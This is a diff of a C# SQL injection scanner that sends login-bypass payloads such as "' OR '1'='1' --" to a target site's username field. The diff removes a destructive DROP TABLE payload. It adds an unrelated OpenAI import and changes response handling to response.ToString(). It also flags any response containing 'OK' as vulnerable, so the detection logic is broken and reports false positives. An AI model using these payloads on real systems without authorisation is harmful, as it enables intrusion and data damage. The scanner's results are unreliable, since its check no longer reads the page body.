@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Net.Http;
 using System.Threading.Tasks;
+using static OpenAI.ObjectModels.StaticValues.AssistantsStatics.MessageStatics;
 
 public class SqlInjectionScanner
 {
@@ -10,6 +11,7 @@ public class SqlInjectionScanner
     public SqlInjectionScanner(string url)
     {
         targetUrl = url;
+
     }
 
     public async Task TestSqlInjection()
@@ -20,7 +22,6 @@ public class SqlInjectionScanner
             "' OR '1'='1' --",
             "admin' --",
             "' OR 1=1#",
-            "'; DROP TABLE users --"
         };
 
         foreach (var payload in sqlInjectionPayloads)
@@ -29,11 +30,12 @@ public class SqlInjectionScanner
 
             var formData = new Dictionary<string, string>
             {
-                { "username", "admin" },
-                { "password", payload }
+                { "Username", payload },
+                { "Password", "abcd" }
             };
 
             var response = await SendHttpRequest(targetUrl, formData);
+            
             AnalyzeResponse(response);
         }
     }
@@ -43,14 +45,15 @@ public class SqlInjectionScanner
         using (HttpClient client = new HttpClient())
         {
             var content = new FormUrlEncodedContent(formData);
+
             HttpResponseMessage response = await client.PostAsync(url, content);
-            return await response.Content.ReadAsStringAsync();
+            return response.ToString();
         }
     }
 
     private void AnalyzeResponse(string response)
     {
-        if (response.Contains("SQL syntax") || response.Contains("error"))
+        if (response.Contains("OK") || response.Contains("SQL syntax") || response.Contains("error"))
         {
             Console.WriteLine("[!] SQL Injection vulnerability detected!");
         }
